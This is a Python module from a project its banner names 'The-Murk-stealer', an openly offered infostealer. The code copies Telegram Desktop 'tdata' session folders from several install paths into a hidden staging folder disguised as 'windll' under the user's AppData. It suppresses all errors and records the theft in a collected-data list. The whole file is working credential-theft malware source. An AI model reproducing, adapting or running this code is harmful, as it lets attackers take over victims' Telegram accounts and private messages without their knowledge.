#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import os
import shutil
"""
all needed paths
"""
path1 = 'D:\\Telegram Desktop\\tdata'
path2 = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'


directory = r'C:\windll\Messengers\Telegram'

def Telegram(data):
    try:
        try:
            pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
            directory = rf'{pathtofile}\windll\Messengers\Telegram'
            shutil.copytree(path1,
                    directory,
                    ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))# copy dirs
        except:
            pass
        try:
            shutil.copytree(path2,
                    directory,
                    ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))# copy dirs
        except:
            pass
        try:
            shutil.copytree(path3,
                    directory,
                    ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))# copy dirs
        except:
            pass
        data.append("\n∟📨Telegram")
        return data
    except:
        return data
